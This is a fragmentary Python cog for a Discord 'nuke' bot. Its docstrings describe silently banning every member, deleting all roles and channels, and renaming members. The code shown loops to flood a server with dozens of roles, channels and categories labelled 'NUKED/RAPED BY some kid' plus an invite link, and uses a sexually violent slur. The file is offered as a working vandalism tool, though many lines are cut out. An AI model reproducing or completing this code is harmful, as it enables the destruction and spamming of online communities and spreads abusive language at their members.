...
class nukes(commands.Cog):
    """All hail some kid we will bring the commoners to their knees"""
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_role(
                    name=f"RAPED BY some kid discord.gg/yes{i}"
                )
                print(
                    f"{Fore.GREEN}[-]ROLE > {Fore.RESET}Made role:  RAPED BY some kid discord.gg/yes{i}"
                )
            except:
        ...
        for i in range(1, 25):
            try:
                await ctx.guild.create_text_channel(
                    name=f"NUKED-BY-some kid-{i}-discord.gg/yes"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made text channel:  NUKED-BY-some kid-{i}-discord.gg/yes"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY some kid {i} discord.gg/yes"
                )
                print(
                    f"{Fore.GREEN}[-]CHANNEL > {Fore.RESET}Made voice channel:  NUKED BY some kid {i} discord.gg/yes"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY some kid {i} discord.gg/yes"
                )
                print(
                    f"{Fore.RED}[-]CHANNEl > {Fore.RESET}Made category: NUKED BY some kid {i} discord.gg/yes"
                )
            except:
    ...
    async def execute(self, ctx):
        """Nukes the fucking shit outta the server banning everyone silently. While no one notices\nNext up it deletes all roles  then creates some kid roles\nThen it deletes all channels possible to then make some kid channels"""
        await ctx.message.delete()
        ...
        for i in range(1, 50):
            try:
                await ctx.guild.create_role(
                    name=f"NUKED BY some kid discord.gg/yes {i}"
                )
                print(
                    f"{Fore.RED}[-]ROLE > {Fore.RESET}Made role NUKED BY some kid discord.gg/yes {i}"
                )
            except Exception as e:
        ...
        for i in range(1, 25):
            try:
                ...
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made text channel! NUKED-BY-some kid-{i}-discord.gg/yes"
                )
                await ctx.guild.create_voice_channel(
                    name=f"NUKED BY some kid {i} discord.gg/yes"
                )
                print(
                    f"{Fore.RED}[-]CHANNEL > {Fore.RESET}Made voice channel! NUKED BY some kid {i} discord.gg/yes"
                )
                await ctx.guild.create_category(
                    name=f"NUKED BY some kid {i} discord.gg/yes"
                )
    ...
    async def undoreall(self, ctx):
        """Renames every member in the server to raped by some kid"""
        await ctx.delete()
        rename_to = ""
        i = 0
